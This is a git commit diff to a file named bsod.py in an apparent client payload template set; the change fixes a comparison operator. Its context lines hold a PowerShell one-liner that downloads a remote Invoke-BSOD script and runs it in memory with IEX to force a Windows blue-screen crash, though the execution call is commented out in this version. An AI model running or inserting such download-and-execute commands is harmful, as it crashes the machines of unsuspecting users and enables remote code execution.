a1909c292beba25652eac4322acf7a818cddbcc4
Obvious Plays <111094267+ObviousTeam@users.noreply.github.com>
2024-09-17 17:31:11 -0400

    = to ==

--- templates/client/pem/bsod.py
+++ templates/client/pem/bsod.py
@@ -2,7 +2,7 @@ import subprocess
 import os
 
 def run():
-    if os.name = "nt":
+    if os.name == "nt":
         powershell_command = "IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/peewpw/Invoke-BSOD/master/Invoke-BSOD.ps1'));Invoke-BSOD"
         print(powershell_command)
         #result = subprocess.run(powershell_command)
